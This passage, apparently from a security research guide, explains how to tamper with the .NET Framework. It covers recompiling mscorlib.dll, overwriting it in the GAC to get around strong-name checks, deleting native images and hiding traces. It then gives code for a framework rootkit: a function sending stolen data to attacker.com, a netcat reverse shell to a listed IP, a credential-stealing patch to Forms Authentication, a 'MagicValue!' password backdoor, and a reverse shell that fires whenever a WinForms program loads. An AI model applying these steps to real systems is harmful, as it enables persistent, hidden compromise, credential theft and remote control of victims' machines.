### Recompiling the DLL using ILASM

The next step is to generate a new, "genuine" DLL from the modified MSIL code. `ilasm` is the .NET Framework's MSIL assembler, which can produce .NET assemblies (EXE or DLL) from a text file containing MSIL code.

To generate the modified `mscorlib.dll` from our `mscorlib.dll.il` text file, execute the following command:
```sh
ilasm /DEBUG /DLL /QUIET /OUTPUT=mscorlib.dll mscorlib.dll.il
```

Now, we have a new, modified `mscorlib.dll`.

### Deploying the Modified DLL Back to the GAC

Our next task is to deploy the modified `mscorlib.dll` back into the Global Assembly Cache (GAC). This process is somewhat tricky due to the strong name (SN) mechanism used by the .NET Framework. The SN mechanism ensures assembly integrity and avoids the "DLL hell" by giving each DLL a unique signature.

Since our modified DLL has a different signature than the original one, it will likely fail to be loaded by other DLLs that expect the correct signature. Using tools like `gacutil.exe` to install the modified DLL into the GAC will fail because we don't have the original private key used by Microsoft to sign the DLL.

However, it was discovered during this research that the modified DLL can be directly copied to the correct location in the file system. The SN mechanism does not check the actual signature of a loaded DLL but instead loads the DLL from a directory containing the DLL signature string.

#### Bypassing the GAC Strong Name Model

1. **Locate the GAC Directory:**
   - Use a tool like Total Commander to access the GAC's file system at `c:\windows\assembly`.
   - The structure of the directory containing the DLL is in the format `VERSION_TOKEN`.

2. **Overwrite the Original DLL:**
   - Copy the modified `mscorlib.dll` to the appropriate directory:
     ```sh
     copy mscorlib.dll c:\WINDOWS\assembly\GAC_32\mscorlib\2.0.0.0__b77a5c561934e089\
     ```
   - Ensure no applications are using the DLL before copying, such as Reflector or Visual Studio.
   - Administrator-level permissions are required for this operation.

### Reverting from NGEN Native DLL

To ensure the framework uses our modified `mscorlib.dll`, we need to disable the native image caching mechanism (NGEN).

1. **Uninstall the Native Image:**
   ```sh
   ngen uninstall mscorlib
   ```

2. **Delete the Native Image Directory:**
   ```sh
   rd /s /q c:\WINDOWS\assembly\NativeImages_v2.0.50727_32\mscorlib
   ```

Alternatively, you can compile the modified DLL into native code using the `ngen` utility and restore the original `mscorlib.dll` to hide traces.

### Testing the Modified DLL

Run your test application again to verify the changes. If everything is set up correctly, you should see the desired output, confirming that the framework has been successfully modified.

### Installing Backdoors and Rootkits

With the ability to modify the framework, we can now plant undetected malicious code inside it. This allows us to backdoor sensitive internal methods and deploy rootkits deep into the framework.

#### Function Injection for Malware Code Reuse

To better develop rootkits, itâ€™s recommended to separate the new "ability" injected into the framework from the code that uses it. For example, let's extend the framework with two new functions:

1. **SendToUrl(string url, string data):**
   - This function sends data from the victim machine to the attacker via an HTTP web request.
   - **Implementation in C#:**
     ```csharp
     public static void SendToUrl(string url, string data)
     {
         WebRequest.Create(url + data).GetResponse();
     }
     ```
   - **Usage Example:**
     ```csharp
     SendToUrl("http://www.attacker.com/DataStealer/RecieverPage.aspx?data=", "SomeSensitiveStolenData");
     ```

2. **ReverseShell(string hostname, int port):**
   - This function provides a reverse shell to the attacker's machine.
   - **Implementation:**
     ```csharp
     public static void ReverseShell(string ip, int port)
     {
         // Code to deploy netcat.exe + cmd.exe and execute a reverse shell
     }
     ```
   - **Usage Example:**
     ```csharp
     ReverseShell("192.168.50.12", 1234);
     ```

### Practical Examples

#### Forms Authentication Credential Stealing

1. **Modify the `Authenticate` Method:**
   - Locate the `Authenticate` method in `System.Web.dll`.
   - Append MSIL code to send the username and password to the attacker using the `SendToUrl` method.
   - **Example:**
     ```csharp
     SendToUrl("attacker.com", name + ":" + password);
     ```

#### Backdooring Forms Authentication

1. **Backdoor the `Authenticate` Logic:**
   - Add code to the beginning of the `Authenticate` method to return `true` if the password contains a special string (e.g., "MagicValue!").
   - **Example:**
     ```csharp
     if (password.Equals("MagicValue!"))
     {
         return true;
     }
     ```

### Injecting a Reverse Shell Inside a Framework DLL

1. **Inject the `ReverseShell` Function:**
   - Inject the `ReverseShell` function into `System.Windows.Forms.dll`.
   - Execute the reverse shell every time a WinForms executable is loaded for demonstration purposes.

By following these steps, you can effectively modify the .NET Framework to include backdoors and rootkits, enabling various malicious activities.
